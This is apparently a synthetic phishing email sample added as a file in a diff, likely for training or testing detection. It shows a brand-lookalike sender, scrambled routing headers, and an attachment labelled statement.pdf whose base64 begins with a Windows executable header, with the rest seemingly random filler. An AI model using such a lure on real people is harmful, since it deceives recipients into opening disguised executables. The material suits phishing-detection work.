@@ -1,0 +1,48 @@
+From: notice@netflix-billing.shop
+To: victim41@example.com
+Subject: Meeting notes for the west power desk [ref AE38851]
+Date: Tue, 24 Mar 2002 00:24:00 -0500
+Message-ID: <phish-161-8ec55b98-2425-4149-a76e-9f67ba835455@netflix-billing.shop>
+Received: from relay0 (relay0.example.net [192.0.2.100]) by mx0.example.com; Tue, 18 Mar 2002 12:39:00 -0500
+Received: from relay1 (relay1.example.net [192.0.2.101]) by mx1.example.com; Tue, 03 Mar 2002 23:44:00 -0500
+Received: from relay2 (relay2.example.net [192.0.2.102]) by mx2.example.com; Tue, 17 Mar 2002 01:39:00 -0500
+Received: from relay3 (relay3.example.net [192.0.2.103]) by mx3.example.com; Tue, 20 Mar 2002 00:34:00 -0500
+Received: from relay4 (relay4.example.net [192.0.2.104]) by mx4.example.com; Tue, 01 Mar 2002 04:04:00 -0500
+Received: from relay5 (relay5.example.net [192.0.2.105]) by mx5.example.com; Tue, 23 Mar 2002 16:58:00 -0500
+Return-Path: <notice@netflix-billing.shop>
+Reply-To: notice@netflix-billing.shop
+Authentication-Results: mx.example.com; spf=pass smtp.mailfrom=netflix-billing.shop; dkim=pass header.d=netflix-billing.shop; dmarc=pass header.from=netflix-billing.shop
+Received-SPF: pass (mx.example.com: domain of notice@netflix-billing.shop designates 192.0.2.21 as permitted sender)
+DKIM-Signature: v=1; a=rsa-sha256; d=netflix-billing.shop; s=default; h=from:to:subject;
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="bnd-p-161-9c20e9d9"
+
+--bnd-p-161-9c20e9d9
+Content-Type: text/plain; charset="UTF-8"
+
+Hi,
+
+Please review the attached schedule before Friday. No action needed beyond that.
+Reference: AE38851
+
+Thanks,
+Colleague
+--bnd-p-161-9c20e9d9
+Content-Type: application/pdf; name="statement.pdf"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename="statement.pdf"
+
+TVqQAFeq3kXcVci9B+YDqca5BDSShL+508qDrQCwa4IixVfsadmU2cvxDcaDZUs6n6l18HuUkhVp
+l7hT1LtmwVkA+Pe9Huk3LI8ME5k06ObVJsjJ9NZD+x9+zYM++Oul5dMfB96qj/biyo3HSQu0UAbT
+mCezSqxspJ+U8dZzt1VYALp6F7qvB8RzO4YAKtuftt60RqInxnY8cwmF7+yW2YSZRFCGTgN0Fbkr
+UsRPyBQsL/VUEtuXt3ZGHD2voX+Ecw4yWgaLN8IaFI6W1H0Gahh539T9+LyyQbnvfNsp4lldYmz5
+aVY4YVh4FthBDqZifK6V09qUD4f1uvs+2Oy/5SL4UeOPmNW+8z5/kvqgoQpiT5FgkZjse6+Ipbtl
+mfUZ04rQbM25Q229WM25ykuzQ8Ujscv3gpDcoTLA7H5BSZKxvQXlJcf85lk/smXRqzX8V8gQNmgW
+F8G9FnmABnK16j/X5nLd031gEiekLu48d6R3rSbl84KYHUvnNLOW7mpv0BJ/++T7WkXR7x6nnYYU
+Vvbnut2bc9ux36vWlApuFuIcGTmajKg5v7VWkIPOl8FEImkjSSyXLVU6R/UyPvnfq2EdsBUceyTX
+1fB47S9UHNKTHE4qKBXXFor6gi6HSKb+egyR5bZpt7qoXS59aRf77jldHNBFdaSylW5PPVW++4aL
+cw0/EJGyjYo82VzWHq8mPFGCmwN3Fe1BtRMOm3FaAqhxUa2FM11c72YQESdLzusPqf6C11yjPAra
+UhtZxRhXBFmQqfptVKO15ax0hbnzmlc30+1pIKxK1mSv4ekSnKUnbhnLFRMo8SEwQlGinP22E/Oa
+Smkka9ezYzIGfeJEzQ==
+
+--bnd-p-161-9c20e9d9--
